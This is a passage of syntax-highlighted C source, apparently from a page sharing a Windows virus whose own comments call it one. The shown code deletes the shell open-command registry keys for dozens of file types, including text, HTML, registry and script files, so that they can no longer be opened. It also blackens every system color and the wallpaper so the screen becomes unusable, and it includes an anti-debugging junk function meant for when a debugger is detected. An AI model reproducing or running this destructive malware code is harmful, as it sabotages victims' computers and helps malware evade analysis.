    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"h323file\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"helpfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"hlpfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"htfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"htmlfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HTTP\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"https\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ICY\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"iiifile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"inffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"inifile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"irc\\Shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jarfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jpegfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"JSFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"JSEFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"JSXFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mailto\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mhtmlfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MIDFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MMS\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MMST\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MMSU\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"movfile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mp3file\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mpegfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"msbackupfile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSBD\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MSCFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"news\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nntp\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"otffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pbkfile\\shell\\Open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PerfFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pfmfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"piffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pjpegfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pngfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pnm\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ppifile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"prffile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rar_auto_file\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ratfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regedit\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rlogin\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rnkfile\\shell\\Connect\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rnkfile\\shell\\Disconnect\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rtffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rtsp\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SC\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scrfile\\shell\\open\\config"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scrfile\\shell\\open\\install"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scrfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scriptletfile\\Shell\\Open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sh_auto_file\\shell\\edit\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sh_auto_file\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Shell\\shell\\explore\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Shell\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SHOUT\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"skype\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"snews\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SoundRec\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SSM\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"steam\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"telnet\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"themefile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tn3270\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"torrent\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ttcfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ttffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"txtfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ulsfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"UNSV\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"UVOX\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBEFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBEFile\\shell\\Open2\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBSFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VBSFile\\shell\\Open2\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"webpnpFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Whiteboard\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wmffile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WMVFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WMZFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WPLFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wrifile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WSFFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WSFFile\\Shell\\Open2\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WSHFile\\Shell\\Open\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WSHFile\\Shell\\Open2\\Command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WVXFile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"xbmfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"xmlfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"xslfile\\shell\\Open\\command"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_CLASSES_ROOT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"zapfile\\shell\\open\\command"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Change every system color to black (00, 00, 00), reading anything or working normally is impossible until this is changed */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">BlackSystem</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc1">/* Array of ALL color values */</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iElements</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">COLOR_3DDKSHADOW</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_3DFACE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_3DHIGHLIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_3DHILIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_3DLIGHT</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_3DSHADOW</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_ACTIVEBORDER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_ACTIVECAPTION</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_APPWORKSPACE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_BACKGROUND</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_BTNFACE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_BTNHIGHLIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_BTNSHADOW</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_BTNTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_CAPTIONTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_DESKTOP</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_GRADIENTACTIVECAPTION</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_GRADIENTINACTIVECAPTION</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_GRAYTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_HIGHLIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_HIGHLIGHTTEXT</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_HOTLIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_INACTIVEBORDER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_INACTIVECAPTION</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_INACTIVECAPTIONTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_INFOBK</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_INFOTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_MENU</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_MENUHILIGHT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_MENUBAR</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_MENUTEXT</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_SCROLLBAR</span><span class="sc10">,</span><span class="sc0">
                        </span><span class="sc11">COLOR_WINDOW</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_WINDOWFRAME</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">COLOR_WINDOWTEXT</span><span class="sc10">};</span><span class="sc0">

    </span><span class="sc1">/* Black */</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwBlack</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">RGB</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)};</span><span class="sc0">
 
    </span><span class="sc1">/* Blacken the system colors */</span><span class="sc0">
    </span><span class="sc11">SetSysColors</span><span class="sc10">(</span><span class="sc4">35</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">iElements</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dwBlack</span><span class="sc10">);</span><span class="sc0"> 

    </span><span class="sc1">/* Blank the desktop Wallpaper (Black) */</span><span class="sc0">
    </span><span class="sc11">SystemParametersInfo</span><span class="sc10">(</span><span class="sc11">SPI_SETDESKWALLPAPER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">" "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Junk code function which can be used to make debugging more complicate and annoying,
not used in the virus, but just try by doing some jnk() calls (important: only use this function when
a debugger is found !) example usage " if (bSoftIce == 1) { jnk(); } "*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">jnk</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc11">jmp</span><span class="sc0"> </span><span class="sc11">$</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">__asm</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">20h</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

